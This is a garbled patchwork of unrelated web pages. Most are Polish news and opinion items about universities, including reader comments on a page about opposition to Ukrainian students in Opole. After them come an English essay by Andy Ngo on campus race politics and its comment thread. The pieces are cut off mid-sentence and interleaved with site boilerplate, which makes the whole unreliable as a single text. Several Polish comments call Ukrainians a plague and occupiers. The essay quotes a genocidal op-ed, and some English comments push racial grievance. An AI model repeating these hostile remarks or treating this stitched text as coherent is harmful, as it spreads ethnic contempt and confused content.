Theresa May poinformowała, że brytyjski rząd przeznaczy 7 milionów funtów z pieniędzy brytyjskich podatników na opłacenie lotów powrotnych dla nielegalnych imigrantów, którzy próbują przedostać się na...

[[ message ]]

Dziękujemy za zapisanie się do naszego newslettera. Poszanowanie praw mniejszości narodowych, wzajemna tolerancja, kultura zdrowego trybu życia, czyli puste i nadużywane obecnie hasła. Władza ma kolejne pomysły na ochronę przed niebezpieczeństwami współczesnego świata londyńskich studentów.Uniwersytet Metropolitan w Londynie zamierza wprowadzić strefy wolne od alkoholu dla studentów. Opiekuńcza uczelnia szczególnie troszczy się o swoich muzułmańskich studentów, którzy zgodnie z własną religią nie powinni spożywać alkoholu. Pomysł jeszcze bardziej poroniony niż zakaz palenia w pubach. A gdzie poszanowanie wobec europejskich katolickich założeń religijnych, mówiących o wolnej woli? Pomysł stref bezalkoholowych oczywiście został w imię dobra publicznego zaakceptowany. Niestety jak zwykle żadna ze stron, ani władze uczelni, ani poprawni politycznie studenci, nie udowodniła, że ma jaja i potrafi takim ugrzecznionym pomysłom powiedzieć "nie". Dla Polaków zawsze przykłady z zachodu stanowiły najświętsze prawo, więc można się spodziewać, że w niedługim czasie również u nas modne staną się strefy bez alkoholu. Chociaż trudno mówić o jeszcze większych restrykcjach, gdyż i tak mamy przecież zakaz spożywania trunków wysokoprocentowych w miejscach publicznych, zakaz palenia w pubach, zakaz przeklinania i wiele innych.Niestety fanatyczne kultywowanie wartościom demokratycznym doprowadza paradoksalnie do unicestwiania szacunku wobec innych ludzi. Coraz rzadziej mówi się o tym co wypada, co można robić, a czego się nie powinno, tylko społeczeństwo ślepo skupia się na tym co jest prawem zakazane lub nie. Zamiast przestrzegać przed zagrożeniami z nadmiernego spożycia alkoholu czy palenia papierosów, uczyć odpowiedniego zachowania wobec osób w towarzystwie niepalących lub niepijących, łatwiej wprowadzić nową ustawę o kolejnym zakazie. A ogłupiałe społeczeństwo tylko kiwa potakująco głowami jak usłyszy hasło tolerancja i miga się od odpowiedzialności za swoich obywateli.HBW wydarzeniu brało udział wiele gwiazd. Zobacz fotorelację!Zobacz zdjęcia z tego wydarzenia.Mobilne kontenery mają współcześnie wiele zastosowań.Szokowi kulturowemu często towarzyszy poczucie izolacji, niepokój, zamartwianie się, obniżenie wydajności pracy.Mario, uczestnik ostatnich Mistrzostw Polski Chippendales będzie gwiazdą imprezy z okazji Dnia Kobiet we wrocławskim Chopper Bar. Jak na bar motocyklowy przystało, tancerzowi towarzyszyć będzie… Harley Davidson.W wydarzeniu brało udział wiele gwiazd. Zobacz fotorelację!Zobacz zdjęcia z tego wydarzenia.Jak to wszystko się zaczęło, czyli kilka słów o historii portaluSprawdź naszą ofertę reklamową - jesteśmy najlepsi!Dołącz do nas - nie pożałujesz!Skontaktuj się z redaktorami portalu - nasza ekipa jest do Twojej dyspozycji!Skontaktuj się z redaktorami portalu - nasza ekipa jest do Twojej dyspozycji!Napisz do nas - odpiszemy raz dwa!
		Żadna część jak i całość utworów zawartych w dzienniku nie może być powielana i rozpowszechniana lub dalej rozpowszechniana w jakiejkolwiek formie i w jakikolwiek sposób (w tym także elektroniczny lub mechaniczny lub inny albo na wszelkich polach eksploatacji) włącznie z kopiowaniem, szeroko pojętę digitalizację, fotokopiowaniem lub kopiowaniem, w tym także zamieszczaniem w Internecie - bez pisemnej zgody Gremi Media SA. Jakiekolwiek użycie lub wykorzystanie utworów w całości lub w części bez zgody Gremi Media SA lub autorów z naruszeniem prawa jest zabronione pod groźbą kary i może być ścigane prawnie.
	
        Rozpowszechnianie niniejszego artykułu możliwe jest tylko i wyłącznie zgodnie z postanowieniami "Regulaminu korzystania z artykułów prasowych" [Poprzednia wersja obowiązująca do 30.01.2017]. Formularz zamówienia można pobrać na stronie www.rp.pl/licencja.
    Dostępne tylko dla zalogowanego użytkownika.Uzyskaj dostęp do aktualnego E-wydaniaMasz aktywną subskrypcję? Zaloguj się lub wypróbuj za darmo wydanie testowe.nie masz jeszcze konta w serwisie? Dołącz do nasUzyskaj dostęp do E-wydania lub wypróbuj za darmoOd ostatnich kilku lat, Chorwacja jest jednym z najbardziej popularnych miejsc wypoczynkowych nad Morzem Śródziemnym. Tysiąc dwieście czterdzieści cztery wyspy, żwirowe, kamieniste i piaszczyste plaże otoczone krystalicznie czystym Adriatykiem, piękne parki przyrody, niezwykłe parki narodowe i pyszne tradycyjne jedzenie, to powody dla których wielu gościŚrodki unijne to duża szansa dla średnich, małych oraz mikro firm. I właśnie do nich skierowanych jest w tym roku kilkadziesiąt programów finansowego wsparcia w całej Polsce, a przykładowa pomoc sięga kilkuset tysięcy złotych. Aplikacja wcale nie musi być trudna i żmudna – wręcz przeciwnie,Coraz więcej osób poszukuje rozwiązań finansowych dla budżetu domowego jak i firmowego poza instytucjami bankowymi. Nie nazywamy już ich parabankami jak to był do niedawna. Dzięki dobrym regulacjom prawnym rynek pozabankowych pożyczek ratalnych ustabilizował się i jest bezpieczny. Pożyczkę ratalną można dziś otrzymać przez internet,Media społecznościowe stały się obecnie jednym z podstawowych kanałów komunikacji z klientami w internecie. Wśród największych i najczęściej wykorzystywanych social mediów od dawna niekwestionowanym królem jest Facebook. Dlatego też żadna firma, która chce odnosić sukcesy w komunikacji z klientami za pośrednictwem social media, nie możeKonkurs KTR to nagroda za kreatywność w branży reklamowej. Event organizowany jest corocznie przez Stowarzyszenie Komunikacji Marketingowej SAR. W tym roku nagrody zostaną przyznane w trzech kategoriach: Komunikacja, Design oraz Craft. W skład poszczególnych kategorii wchodzą: Komunikacja: Video, Audio, Print & Publishing, Out Of Home,Lokalność w reklamie Kasztelana Carlsberg wraz z początkiem maja atakuje kampaniami swoich marek, jedną z większych jest kampania reklamowa piwa Kasztelan pod hasłem „Ręczymy za każdą butelkę”. W dobie gdy ogromną popularność zyskują piwa rzemieślnicze wyrabiane w małych, lokalnych browarach Kasztelan także postanowił postawić w
		Żadna część jak i całość utworów zawartych w dzienniku nie może być powielana i rozpowszechniana lub dalej rozpowszechniana w jakiejkolwiek formie i w jakikolwiek sposób (w tym także elektroniczny lub mechaniczny lub inny albo na wszelkich polach eksploatacji) włącznie z kopiowaniem, szeroko pojętę digitalizację, fotokopiowaniem lub kopiowaniem, w tym także zamieszczaniem w Internecie - bez pisemnej zgody Gremi Media SA. Jakiekolwiek użycie lub wykorzystanie utworów w całości lub w części bez zgody Gremi Media SA lub autorów z naruszeniem prawa jest zabronione pod groźbą kary i może być ścigane prawnie.
	
        Rozpowszechnianie niniejszego artykułu możliwe jest tylko i wyłącznie zgodnie z postanowieniami "Regulaminu korzystania z artykułów prasowych" [Poprzednia wersja obowiązująca do 30.01.2017]. Formularz zamówienia można pobrać na stronie www.rp.pl/licencja.
    Dostępne tylko dla zalogowanego użytkownika.Uzyskaj dostęp do aktualnego E-wydaniaMasz aktywną subskrypcję? Zaloguj się lub wypróbuj za darmo wydanie testowe.nie masz jeszcze konta w serwisie? Dołącz do nasUzyskaj dostęp do E-wydania lub wypróbuj za darmoZielonogórscy radni oburzają się, że oddają ziemię za symboliczną złotówkę, a uniwersytet sprzedaje ją developerom. Władze uczelni tłumaczą, że chodzi o jej rozwój, bo placówka obecnie boryka się z problemami finansowymi.Zaczęło się od zbyt małej obecności Afroamerykanów na uniwersytetach. Wprowadzono zatem preferencje przy rekrutacji. Teraz okazuje się, że czarnoskórzy naukowcy w USA znacznie rzadziej niż ich biali koledzy otrzymują od rządu granty na badania naukowe.Eksperci z Uniwersytetu Kansas przeanalizowali dane na temat wyników starań 40 000 naukowców o granty przyznawane przez Krajowy Instytut Zdrowia (NIH) w latach 2000-2006. Okazało się, że podania tylko około 16 procent murzyńskich naukowców zostały rozpatrzone pozytywnie, podczas gdy zaaprobowano wnioski o granty 29 procent białych naukowców. Zaledwie 1,4 proc. wniosków o granty pochodziło od czarnoskórych naukowców. Chociaż Afroamerykanie stanowią 12,6 proc. ludności USA, są znacznie niedoreprezentowani w społeczności naukowej, i to mimo "akcji afirmatywnej", czyli systemu preferencji dla nich przy przyjmowaniu do pracy. Składając podania o granty, naukowcy muszą podawać swoją rasę i pochodzenie etniczne, ale informacje te nie są przekazywane członkom komisji rozpatrujących podania - naukowców w większości spoza NIH. Z drugiej strony, informując o badaniach ekspertów z Kansas, prasa zwraca uwagę, że rasa ubiegających się o granty naukowców jest często łatwa do zidentyfikowania, m.in. na podstawie ich biografii, a zwłaszcza przebiegu edukacji - rodzaju ukończonej uczelni itp. (np. Afroamerykanie często są absolwentami tradycyjnie murzyńskich uniwersytetów, jak Howard w Waszyngtonie). Niektórzy murzyńscy uczeni komentujący badania z Kansas twierdzą, że prawdopodobnie nie chodzi o rasizm oceniających podania o granty, lecz tylko "nieuświadomione uprzedzenia" wobec czarnych naukowców. Szef NIH dr Francis Collins, wybitny uczony-genetyk, powiedział, że "sytuacja ta jest nie do przyjęcia", i obiecał, że placówka podejmie działania mające ją naprawić. NIH sam zamówił na Uniwersytecie Kansas badania na temat rasowych rozpiętości w przyznawaniu grantów.Czytaj online najnowsze wydania „Newsweek Polska”, „Newsweek Historia” oraz wybór tekstów z wydania amerykańskiego!LogowanieNie masz jeszcze konta?Wybierz regionWybierz miasto
Autor: Zuza Gunia        Ukraińscy studenci w Polsce (© archiwum/Polskapresse)Masz zdjęcie do tego tematu?
    Na facebooku pojawiła się strona "Stop Ukrainizacji Uniwersytetu Opolskiego". Czy ukraińscy studenci w Polsce nie są mile widziani?
  Podziel się na TwitterzeSkomentujAntyterroryści wpadli do Wyższej Szkoły Zarządzania i Administracji w OpoluRock Time 2018. Zespoły mogą już się zgłaszać! Finał w marcu w NCPP Do nyskiego konkursu informatycznego Hackaton stanęło 13 drużyn z całej PolskiDodaj zdjęcie do materiału.Aby wysłać zdjęcie musisz zgodzić się z poniższym warunkiem.pytanie 1: No matter how hard I try, I never _____ your expectations.
    Podane dane osobowe będą przetwarzane przez Polska Press Sp. z o.o. z siedzibą w Warszawie. Podanie danych jest dobrowolne.
  Pozostałe informacje na temat celu i zakresu przetwarzania danych osobowych oraz Twoich praw znajdziesz w regulaminie.
    Dodając komentarz akceptujesz regulamin.
  Zaloguj się / Zarejestruj się!
    Podane dane osobowe będą przetwarzane przez Polska Press Sp. z o.o. z siedzibą w Warszawie. Podanie danych jest dobrowolne.
  Pozostałe informacje na temat celu i zakresu przetwarzania danych osobowych oraz Twoich praw znajdziesz w regulaminie.
    Dodając komentarz akceptujesz regulamin.
  Zaloguj się / Zarejestruj się!
        Bitwa o Anglię coś ci mówi? Byliśmy na każdym froncie i wnieśliśmy duży wkład w zwycięstwo w czasie gdy ukraińcy tatuowali sobie swastyki. Sprawdź sobie jakiej narodowości byli siepacze którzy szli za głównym natarciem tak u nazistów jak i u sowietów. Polecam też poczytać sobie o drugim maja 14r Odessa.      
        PACANIE, Polacy nie mordowali siekierami,kosami ,widłami .Tzw.Zachód ma dług moralny w stosunku do Polski .Jak nie wiesz jaki to popytaj innych.      
        jakim braciom polakom? ten twoj brat szedł przez polske gwałcił kradł zachowywał sie gorzej od rusków. Zastanów sie ośle z kim sie chcesz bratać      
        No cóż... okazuje się, że nie każdy Zapcim Górny dorósł mentalnie do tego, żeby mieć uczelnię wyższą. Opole najwyraźniej ma to jeszcze przed sobą.      
        Gościu leć pędem do sklepu z narzędziami i poproś o największy młotek. Potem się nim walnij w łeb. Jak zrobisz to szybko to może Ci się uda wyrzucić (chociaż częściowo) głupotę, bo Ci się farmazony ustami wylewają      
        a czemu ja mam placic za was polaczkow co to w polsce nie daje sobie rady to ucieka na wyspy na socjal  ja nigdy nie pracowalem za granica wiec niehchce takich polaczkow(biednych ukraincow) u siebie proste      
        Zapytajcie Ukraińców ile kieszonkowego dostają od Polski. 2000 zł.      
        Ciekawe bo Brytyjczycy mówią to samo o Polakach... 
Ukraińcy, nie dajcie się, przypomnijcie braciom Polakom jak byli biedni 20 lat temu i jakie wspólne zagrożenia niesie przyszłość. 

Pozdrowienie z Londynu      
        Płaca więcej to mają :) zwyczajna sprawa      
        Polacy we własnym kraju są traktowani jako podludzie. Stop nowym okupantom.      
        Przyjeżdżajo tutaj i kradno buty w ałtobusah ;D      
        W Opolu są jakieś szkoły wyższe?? chyba to pomyłka i gdzie jest to opolu?      
        ogólnie nie mam nic praciwko ludziom ale akurat ukraincy to zaraza ,gdzie się pojawią to robia wszystko by polaków wygryźć ..np.z pracy ..bedą robic dwa razy dłuzej za niej..i kazdy szef polaka zamieni na takiego lub taką k.....      
        Nie mam nic do studentów z Ukrainy ale Lwów i Kijów to by mogli w końcu oddać.      
        Dzięki, błąd poprawiony!      
                          Zderzenie trzech aut pod Opolem. Jedna osoba ranna
                      
                          Memy internautów po meczu Polska - Chile [GALERIA]
                      
                          Debiuty 2018. Zespół Girls on Fire z nagrodą im. Anny Jantar! Siostry Melosik z nagrodą publiczności
                      
                          Festiwal Opole 2018. Tak wyglądał "Przebój na mundial" za kulisami [ZDJĘCIA]
                      
                          Barbara Kurdej-Szatan zostawiła odcisk swoich dłoni w gipsie w alei w Dworku Artystycznym w Opolu
                      
                          Zespół Budka Suflera odsłonił gwiazdę w Alei Gwiazd Polskiej Piosenki w Opolu 
                      Jarosław Bieniuk: Miałem jedno marzenie, zostać profesjonalnym piłkarzemHuawei i Leica. Tradycja w służbie nowoczesnej fotografiiNajniebezpieczniejsze selfie świata. Te zdjęcia szokują. Wielu zginęło! [ZDJĘCIA]Cała rozrywka w jednym miejscu!Hity szkolnych sprawdzianów! Zobaczcie, co na sprawdzianach piszą uczniowie....Małżeński Rajd Dakar - znakomita komedia w teatrach w PolsceFestiwalowy Most z pianinem i parasolkami już otwarty! Happening nad MłynówkąFestiwal Opole 2018. Andrzej Piaseczny gościem na koncercie Debiuty [zdjęcia...Trzydzieści 1000-litrowych beczek z chemią odkryto pod OpolemRakotwórcza i szkodliwa substancja znaleziona pod Opolem [dużo zdjęć]
                                  Tak tańczą opolskie przedszkolaki. II festiwal tańca [dużo zdjęć]
                              
                                  Obwodnica Piastowska w Opolu. Miejska inwestycja zaczyna się od wielkiej wycinki [zdjęcia, wideo]
                              Rekrutacja na Uniwersytet Opolski w liczbachWielkie Grillowanie na UO. Studenci kontra deszcz! [wideo, zdjęcia]Nie dla Wyborów Miss Uniwersytetu Opolskiego Politechnika Gdańska będzie wynajmować kibicom pokojePolska Press sp. z.o.o informuje, że wszystkie treści ukazujące się w serwisie naszemiasto.pl podlegają ochronie.
            Dowiedz się więcej.
            Jesteś zainteresowany kupnem treści? Dowiedz się więcej.
          
              © 2000-2018 Polska Press Sp. z o.o.
Handlowanie zaliczeniami miało być sposobem na zwiększenie dochodów ze sprzedaży publikacji. - Wydawnictwo chce, żeby książka się sprzedała - otwarcie przyznał wykładowca nieświadomy tego, że rzekomą studentką jest reporterka TVN24.Pracownik uczelni jest profesorem zwyczajnym i od wielu lat pracuje na Uniwersytecie Wrocławskim. Sprawą już zajęły się władze uczelni.Nie jest wykluczone, że naukowiec zostanie całkowicie odsunięty od pełnienia swoich obowiązków. Ma to zapobiec ewentualnej zemście belfra na osobach, dzięki którym nagranie ujrzało światło dzienne.(TR)Ostatnio:
19.12.2017
Chciałem opisać niezwykle przyjemną historię która spotkała mnie po kontakcie z pewnym Szwedem. Niemniej od początku. Jestem programistą Pythona, do tej pory klepałem głównie serwisy WWW, ostatnio jednak zainteresowałem się obliczeniami (matematycznymi i nie tylko) w tym języku. Poszukiwania książki na ten temat zawiodły mnie na stronę wydziału technicznego "Lund University" w Szwecji. Jeszcze konkretniej, na stronę kursu "Computational Mathematics with Python". Na tejże stronie przeczytałem, że dostępny jest dla studentów manuskrypt przegotowany przez jednego z prowadzących. Skontaktowałem się z tymże prowadzącym drogą e-mailową. Napisał, że nie ma problemu, że wyśle mi ten manuskrypt. Podałem mu więc adres i zapytałem gdzie i ile mam zapłacić. Oto co odpisał:Tydzień później otrzymałem przesyłkę:Jest mi niezmiernie miło, że środowisko akademickie jest dla siebie takie przyjazne. Dlatego też postanowiłem zrobić ten wykop. Takie przykłady trzeba chwalić.
Ta strona powstała 11.06.2012.
Ostatnia edycja 11.06.2012.
Wizyt: 7184.

Korzystanie z serwisu oznacza akceptację
Regulaminu.
Prywatność.
Copyright – 1999-2018 INTERIA.PL,
wszystkie prawa zastrzeżone.
W najnowszym wydaniu plus.nowiny24.pl17artykułów
Andrzej Plęs, Małgorzata Froń






        25 października 2013
                  06:51
              

        25.10.2013
                  06:51
              





©Krzysztof Kapica 
                      Zobacz dzisiejsze wydanie internetowe Nowin
                  
©Krzysztof Kapica Nielimitowany dostęp do wszystkich treści, bez inwazyjnych reklam.Rozpowszechnianie niniejszego artykułu możliwe jest tylko i wyłącznie
              zgodnie z postanowieniami „Regulaminu korzystania z artykułów prasowych” i po wcześniejszym uiszczeniu należności, zgodnie z cennikiem.
            
kriso322 13 stycznia, 01:14 
                Minister może sobie żądac. Już nie ma ministra. A potem kolejnego i kolejnego. Może by tak wreszcie mnie zatrudnili ? Warszawscy spece-liberały i inne petry mnie wywalili z doktoratu więc się swietnie nadam do kontrrrry !  kriso322@o2.pl                    
PRAWDA I TYLKO PRAWDA 27 marca, 21:44 
                Cały ten wydział to dno. Już nie chodzi nawet o tą sytuację z powiązaniami rodzinnymi, tylko po prostu o poziom.   JEST TO DNO pod względem wydziałów prawa w POLSCE, można się spokojnie na prawo dostać z poprawnie napisaną maturą podstawową lub rozszerzonymi po napisanymi na 15%. [...]                 
OOO 17 listopada, 08:10 
                 Miał taką średnią ale razem z dziewczyną nie chodził na większość egzaminów tylko dostawał piątki z urzędu. Wszyscy o tym wiedzą.                  
AW 13 listopada, 14:57 
                Jest zgodnie jak z hasłem ,,Rodzina na swoim ,,                  
xyz 13 listopada, 14:12 
                Dziękuję Słowaczce za zaliczenie na email a co wysłałem .... hmm może instrukcja obsługi suszarki zresztą kobieta jest tylko dla statystyki skoro nie rozumie języka polskiego...prawda czy fałsz w tym  komentarzu?  możesz ocenić i dodać odpowiedż                  





tel.: 17 867 22 00
alarm@nowiny24.pltel.: 17 867 23 30
nowiny.ogloszenia@polskapress.plNowiny jest częścią:

Polska Press Sp. z o.o.
                 informuje, że wszystkie treści ukazujące się w serwisie Nowiny podlegają ochronie.
        Dowiedz się więcej.
        Jesteś zainteresowany kupnem treści? Dowiedz się więcej.
      © 2000 - 2018 Polska Press Sp. z o.o.


Wczytuję...
    



Wczytuję...
    



Wczytuję...
    



        Działam...
    



Wczytuję...
    



Wczytuję...
    



        Działam...
    



Wczytuję...
    



Wczytuję...
    



Wczytuję...
    



Wczytuję...
    
hip-hopowa animacja; kto ze studentów nie miał przejść z kobietami pracującymi w dziekanacie? :)Immersum, 2007, http://immersum.pl/


Wczytuję...
    



Wczytuję...
    



Wczytuję...
    



Wczytuję...
    



Wczytuję...
    



        Działam...
    



        Wczytuję playlisty...
    
When I started my graduate education at Portland State in 2015 after a long hiatus from academe, I attended an event titled, “Students of Color Speak Out.” The university president encouraged all students, staff and faculty to attend the event, organized in reaction to alleged racial tensions on campus. As a student of color and the gay son of refugee immigrants, the event’s premise interested me.As I sat in the front, I listened to students detail their daily trauma of existing on a campus that was majority white. Students representing many ethnicities repeatedly shared feeling unsafe. I was confounded because their anecdotes spoke of an experience that sounded similar to those who lived in apartheid-era South Africa or Jim Crow Mississippi — not something I remotely recognized in ultra-progressive Portland. Still, I was sympathetic and recognized that my personal experiences may not be shared by others.My optimism was challenged once I began to pick up on the theme connecting the speeches. It was the visibility of white students, or more broadly white people themselves, that made the activist students feel unsafe and unwelcome on campus. One speaker said she feared a white gunman would imminently massacre those in attendance. The language and tone of suspicion of others was jarring to the anti-racist activism I was familiar with in my undergraduate and high school days, which sought to unify diverse students through inclusion. In-between and during speeches, students sprinkled in various chants. What I heard was a siren’s song leading us to a culture of racial division and mistrust.Looking at the event guidelines, I was surprised that white students were explicitly asked to remain silent. Several speakers demanded the president dedicate separate spaces along racial lines in the student union. He later agreed.Even though the event was billed as a day of anti-racism, what I witnessed was, quite frankly, racism. Until that day, I’d never seen people overtly dehumanized and treated as racialized objects – amplified through the use of words like “bodies” to refer to people of color. I left the event wondering if the sum of my worth was on an identity I was born into.Since continuing my education, I’ve come to quickly learn that on campuses today, racism no longer means what I understood it to be all my life. According to critical race theorists, who permeate academe and its administration, racism is not ethnic prejudice and discrimination but rather prejudice and institutional power. Because whites have institutionalized privilege, they say it is impossible for them to be victims of racism. In this worldview, I should be alarmed when prejudicial sentiment is hurled at some, but not all, of my peers.I demurred.On Tuesday, the student paper at Texas State University published an op-ed telling whites, “Your DNA is an abomination.” The opinion columnist opens by saying he has only met a dozen white people in his life that he would consider “decent.” The opinion columnist wrote: “Ontologically speaking, white death will mean liberation for all … accept this death as the first step toward defining yourself as something other than the oppressor.” He goes on to conclude: “Until then, remember this – I hate you because you shouldn’t exist. You are both the dominant apparatus on the planet and the void in which all other cultures, upon meeting you, die.”This is shocking. @UniversityStar Texas State student paper ran a pro-genocide social justice op-ed. Actual quote: “Ontologically speaking, white death will mean liberation for all…Until then, remember this: I hate you because you shouldn’t exist.” https://t.co/xGncbr2q7e— Andy C. Ngo (@MrAndyNgo) November 29, 2017The now-retracted op-ed has launched a national outcry against the paper and the university. The editor-in-chief apologized for its content and the university president condemned it as racist.Those who are shocked that the author’s odious view made it to print underestimate the pervasiveness of radical social justice ideology in the academy. As I’ve witnessed in 2015 and have seen repeated countless times since then, the lack of any ideological counterpoise has created a vacuum where ideas have no mechanism or incentive for moderation.In elementary school, I remember when I was taught a valuable lesson on race and identity. One of my teachers pulled out an illustration showing a variety of people engage in various occupations. “What do you see?” she asked us, pointing to a person with a stethoscope. I raised my hand and said: “a black man.” She told me to try again. “Doctor,” I eventually replied. She smiled with a nod. If that lesson was repeated again today, I’m not sure my second answer would be accepted. Andy Ngo is a journalist and graduate student in political science at Portland State University.A well-written piece with a poignant conclusion.  The trouble with radical social justice ideology is that it leaches beyond academic absurdism and into reality.  There is a need for the elite to propagate racism to justify their own abuse of power and indolence, and cow the working class.  Privilege is primarily a class caste in which the whites (in the West) have a head-start due to demographics.   It is increasingly difficult for an individual to receive compassion or justice for a wrong without their colour and that of their immediate oppressor stirring an unhelpful debate to obfuscate any objective penalty and reconciliation for the actual, local injury caused.  All are victims and all are to blame is the logical conclusion of such fallacy.Great article. That column seems like a new low. Although, as you suggest, it was the inevitable result of an increasingly radical ideological indoctrination.Impossible not to be utterly confused by the discussion on race and racism of today. Something is deeply wrong when you can loop back to the racial studies performed in the dark corners of the academic world in the 19th century, the tone of language and debate of the 1930’s politicians, and the practise of the 20th century apartheid politics of South Africa, and conclude they might not have been all that wrong. The only difference being the demands of today stems from the ‘oppressed’ rather than the ‘oppressive’.Take any foul statement. If a minority representative says it, it is considered a positive thing. If a majority representative says the very same thing, it is evil by default. The double standards of the modern social justice movement is baffling, and to be honest, very, very scary.Opressor and opressed are meaningless words. Many if not  all real opressors thought themselves as victims and hence oppressed.
The Nazis believed they were the victims of the worlwide Jewry. The Russian proletarians thought they were the victims of the kulaks and so on.
In the end all collectivists must define a group as the oppressive enemy.The student who wrote “Your DNA is an abomination” does seem to exhibit many of the classic tropes of racism, such as blaming one’s difficulties on some unimaginably evil “other.” Instead of, perhaps, looking at how one’s own efforts and shortcomings might have rather more to do with where one finds oneself.In any case, it should be apparent to all that one can’t very well have a dialog with someone who asserts that, really, it would be better if you did not exist. For what would one discuss, how and where and when one should die?I totally agree.  It is precisely the “problem” in the Middle East.  Muslims don’t just want Jews to ‘give back’ Palestine, they want Jews to be eradicated.  How do you peacefully solve THAT conundrum??  (For the record, I am a Roman Catholic, not at all Jewish.  It just disgusts me that anyone, anywhere, should wish the death of another human being, let alone an entire population!)The demands are coming from the supposedly “oppressed”, figment of imagination, while the “oppressor” is bending over backwards to make people comfortable even though it can clearly never be enough. As a white person who was raised to be extremely accepting, but not subservient, I find myself asking….”Why bother? No matter what I do I am going to be be hated by these people?”. It’s not a small number of people either as college campuses are pumping out millions of these brain washed psychos. Why should I not simply look after white people who are clearly being assaulted by a quasi intellectual zeitgeist within academia?Everyone is well aware of the double-standard at work here – the reason it’s persisted and become such a common political tool is that we all accept the premise on some basic level.  Chris Rock once had a routine about how different groups of people have different socially recognized “license” to criticize other groups, following the “punching up/down” formula.  For example, fat women can be unfairly critical of skinny women, because everyone knows skinny women have more social capital.  By allowing fat women to express resentment or hostility toward skinny women, we establish an emotional coping mechanism as a fair and harmless compensation for being socially disadvantaged.  This only works in one direction of course; skinny women can’t criticize fat women because, given the underlying privilege differential, “that’s just mean”.I think most people recognize some version of this principle, and have participated in it.  There’s a dynamic ratio between the shittiness of someone’s situation, and their “right to complain”, especially including the right to be obnoxious, gratuitous, grating and unfair in their complaints.  It’s just something others have to tolerate as a courtesy to the aggrieved party.Obviously this loose social norm has been systematized in the employ of social justice ideology, (or for that matter any ideology rooted in grievance and victimhood) and it happens to be a great fit.  It serves as an outlet for the rage and paranoia many ideologues feel at being victimized by their perceived oppressors.  It gives them “license” to indulge in toxic, unproductive, but self-indulgent and emotionally satisfying rhetoric and behavior.  And in a brilliant stroke, the objects of their ire can’t protest without being guilty of violating some inferred social contract of fairness and decency!The mistake was allowing this weird dynamic to take on the semblance of intellectual seriousness, as if it were some kind of credible epistemological argument, instead of, essentially, pandering to someone’s bullshit out of pity.  It was able to mutate because of people’s understandable unwillingness to deconstruct the underlying phenomena for fear of appearing insensitive or hostile.  Now it’s routinely used as a matter-of-fact excuse for all kinds of garbage and bullshit that is considered beyond the pale in any other power-directional configuration.Maybe we should start holding EVERYONE to a unifying standard – that you shouldn’t do and say things about other people that you wouldn’t want other people to do or say about you.  What a novel concept!  And to those who would whine “since I don’t have power, it’s harmless for me to express awful, indefensible things”, maybe the response should be “first, you’re not as powerless as you think, and second, thanks for warning us about you, asshole”.Nailed it. Exactly my thoughts. We need to explain this to people more often.What Emblem14 said…I agree with you but pity isn’t enough to explain the fervent support that “punching up” enjoys in academe, media and mainstream politics. Liberalism falters badly when explaining racial and sexual differences in outcomes. In a way it carried this seed with the insistence on equal opportunity and the notion that hard work is all it takes to reach the top. Look at what happened to James Damore. SJWs’ narrative inspires more fervent belief than liberal rationalism. LIberalism offers no solutions to the bruised egos of the groups on the bottom. SocJus offers absolute explanations and action, sinecures and radicalism.We whites only have ourselves to blame for this madness, and the sooner we all understand it the better.In play is the state’s age-old strategy of divide and rule, whereby society is divided into a morally superior, now supposedly non-tribal, unprejudiced, “colour-blind” and xenophilic elite, on the one hand, and the morally inferior, naturally (evolved human nature being what it is) tribal, prejudiced, not colour-blind, but xenophobically-inclined masses, on the other, who must submit to the authority of and domination by their “moral superiors”, just as in medieval times, when the ideology on which this strategy was based was religious. Now it’s a racial ideology, facilitated by the understandable overreaction to Nazism and the Holocaust, which was to deny the importance – even the very reality – of race & to make a great virtue of denial. I elaborate further in my blog: http://philosopherkin.blogspot.co.uk/2016/10/political-implications-of-evolutionary.htmlWell first of all if anyone referred to themselves as color-blind they would be called a racist.
Your working on the old paradigm, where the goal was to reach colorblindness, but in the way CRTs do they changed the definitions to suit their agenda and didn’t let the masses know.I don’t know what is more telling about the sad intellectual atmosphere of the Universities. The near-genocidal argument published in the student’s newspaper, or its bizarre use of the word “ontologically”Thank you Andy, great piece.
What’s even worse is that there is something so much more malevolent at work here than just inappropriate expression of dissatisfaction.
The deliberate stoking of discontent of the unsuspecting vulnerable ‘under privileged’ by academia & the media for the express purposes of disunity & anarchy at the cost of improved conditions.
Exploitation of suffering is merely the vehicle to drive totalitarianism.“Exploitation of suffering is merely the vehicle to drive totalitarianism.”That is the best quotable line I’ve read in a while. I will put it to liberal use. Thanks!Well written piece, Andy.  At the core of the Critical Theory school of thought is the mantra of “Judge us blindly and treat us equal” while at the same time judging on skin color gender themselves.  You gave examples of white versus black but the same goes for male versus female.  The most recent national election is a pointed example with many who decried the allegation that President Obama was elected in 2008 (and 2012) because of people voting for him simply because he was black in turn demanding votes for Secretary Clinton solely because of her chromosome makeup.  It is a serious flaw in the belief when you begin to take a position that “discrimination is bad except when…”If this foolishness continues I’d guess that the next ‘race’ to be demonised will be those who are ‘not brown enough’, and then the ‘not black enough’ and so on.to ac harper:  it’s already happening.  asian-heritage student applicants are being discriminated against by Harvard in it’s admission policies.Asians are basically considered honorary whites in the realms of social justice.And the “not brown enough” thing is already real, I’ve seen people get called “white passing” (which is viewed as a racist thing to be by social justice), for not being brown enough,Also, don’t forget the Kafkaesque trap the Social Justice (aka SocJus) crowd will place on you if you speak out on CRT or the emerging victim paradigm being put forth. They will say you have White Fragility, fear of losing your place in society ect…. All the while you will see gleeful headlines
about how whites will be the minority by mid century. Somehow excoriating whites for noticing while shouting down their majority privilege. This is truly stuff the communist did. I read The Gulag Archipelago by Aleksandr Solzhenitsyn and the parallels are erie.I’m not saying whites will be put in the gulag or anything nutty like that what i’m saying is the kafka academes  wordplay has a very similar feel. Where there’s no way to disprove the absurdness of it. That’s probably why thousands upon thousands were put in soviet mental institutions during the communist regime (after they stopped mass slaughtering people) because it literally drove them crazy.If these naive students weren’t brainwashed by their professors, these displays of totally divorced from reality outrage simply wouldn’t exist.  What’s happening in academia and the wider culture isn’t a rational, proportional reaction to existent inequity.  It’s more like the result of a giant lab experiment in which people are given labels such as ‘victims/oppressed,’ given a level of fear based deference they’ve never experienced before in their young lives and then facing no legitimate or effective response to their illusions.  This regressive liberalism a canvas for the psychologist to explore, not the sociologist.My typos are noted lolThis is what happens when you teach your children to be something other than an American first.  Hyphenated Americans are anything but Americans. It is also the result of not teaching your children to love their neighbors. Between loss of God in our society, and ridiculous exultation of a person’s race and self, this stupidity will only continue to worsen.  Sadly for people who are not Caucasian, this is detrimental, because as an American, I like Dr. King, look at the content of a man’s character first.  If you don’t like me because I’m White, 